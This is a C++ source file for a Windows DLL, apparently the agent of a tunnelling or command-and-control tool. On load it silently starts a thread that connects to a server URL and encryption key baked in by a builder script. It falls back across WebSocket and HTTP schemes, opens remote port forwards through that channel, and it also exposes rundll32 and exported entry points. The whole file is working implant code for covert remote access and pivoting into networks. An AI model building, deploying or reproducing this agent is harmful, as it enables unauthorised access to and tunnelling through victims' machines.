#include "crypto.h"
#include "message.h"
#include "messenger_client.h"
#include "websocket_messenger_client.h"
#include "http_messenger_client.h"
#include "remote_port_forwarder.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <future>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

// Builder-hardcoded defaults (replaced by builder.py)
static const std::string DEFAULT_SERVER_URL  = "{{ server_url }}";
static const std::string DEFAULT_ENCRYPTION_KEY = "{{ encryption_key }}";
static const std::string DEFAULT_REMOTE_PORT_FORWARDS = "{{ remote_port_forwards }}";

static std::vector<std::string> parse_forwards(const std::string& raw) {
    std::vector<std::string> result;
    if (raw.empty() || raw == "{{ remote_port_forwards }}") return result;
    std::istringstream iss(raw);
    std::string token;
    while (iss >> token) {
        result.push_back(token);
    }
    return result;
}

static void run(const std::string& uri_arg, const std::string& key_arg,
                const std::vector<std::string>& remote_port_forwards) {
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return;
    }

    std::vector<uint8_t> encryption_key = Crypto::hash(key_arg);

    std::string uri = uri_arg;
    while (!uri.empty() && uri.back() == '/') {
        uri.pop_back();
    }

    std::vector<std::string> attempts;
    auto pos = uri.find("://");
    if (pos != std::string::npos) {
        std::string schemes = uri.substr(0, pos);
        uri = uri.substr(pos + 3);

        std::istringstream stream(schemes);
        std::string scheme;
        while (std::getline(stream, scheme, '+')) {
            attempts.push_back(scheme);
        }
    } else {
        attempts = {"ws", "http", "wss", "https"};
    }

    std::unique_ptr<MessengerClient> client;

    for (const auto& attempt : attempts) {
        std::string url = attempt + "://" + uri;
        bool success = false;

        try {
            if (attempt.find("ws") != std::string::npos) {
                auto ws_client = std::make_unique<WebSocketMessengerClient>(url, encryption_key);

                for (const auto& config : remote_port_forwards) {
                    auto forwarder = std::make_unique<RemotePortForwarder>(*ws_client, config);
                    std::thread([f = std::move(forwarder)]() { f->start(); }).detach();
                }

                ws_client->connect();
                client = std::move(ws_client);
                success = true;
            } else if (attempt.find("http") != std::string::npos) {
                auto http_client = std::make_unique<HTTPMessengerClient>(url, encryption_key);

                for (const auto& config : remote_port_forwards) {
                    auto forwarder = std::make_unique<RemotePortForwarder>(*http_client, config);
                    std::thread([f = std::move(forwarder)]() { f->start(); }).detach();
                }

                http_client->connect();
                client = std::move(http_client);
                success = true;
            }
        } catch (...) {
            continue;
        }

        if (success) {
            std::promise<void>().get_future().wait();
            break;
        }
    }

    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Only auto-connect if builder has baked in config
        if (!DEFAULT_ENCRYPTION_KEY.empty() && DEFAULT_ENCRYPTION_KEY != "{{ encryption_key }}") {
            std::thread([]() {
                auto forwards = parse_forwards(DEFAULT_REMOTE_PORT_FORWARDS);
                run(DEFAULT_SERVER_URL, DEFAULT_ENCRYPTION_KEY, forwards);
            }).detach();
        }
    }
    return TRUE;
}

// rundll32 entry point
// Usage: rundll32 messenger-client-cpp.dll,Run <uri> <encryption_key> [forwards...]
extern "C" __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    std::string cmdline(lpszCmdLine);
    std::istringstream iss(cmdline);
    std::vector<std::string> args;
    std::string token;

    while (iss >> token) {
        args.push_back(token);
    }

    if (args.size() < 2) {
        return;
    }

    std::string uri = args[0];
    std::string key = args[1];
    std::vector<std::string> forwards(args.begin() + 2, args.end());

    run(uri, key, forwards);
}

// Programmatic entry points
extern "C" __declspec(dllexport) void Execute(const char* uri, const char* encryption_key) {
    std::thread([u = std::string(uri), k = std::string(encryption_key)]() {
        run(u, k, {});
    }).detach();
}

extern "C" __declspec(dllexport) void ExecuteWithForwards(
    const char* uri, const char* encryption_key,
    const char** forwards, int forward_count
) {
    std::vector<std::string> fwds;
    for (int i = 0; i < forward_count; i++) {
        fwds.emplace_back(forwards[i]);
    }
    std::thread([u = std::string(uri), k = std::string(encryption_key), f = std::move(fwds)]() {
        run(u, k, f);
    }).detach();
}
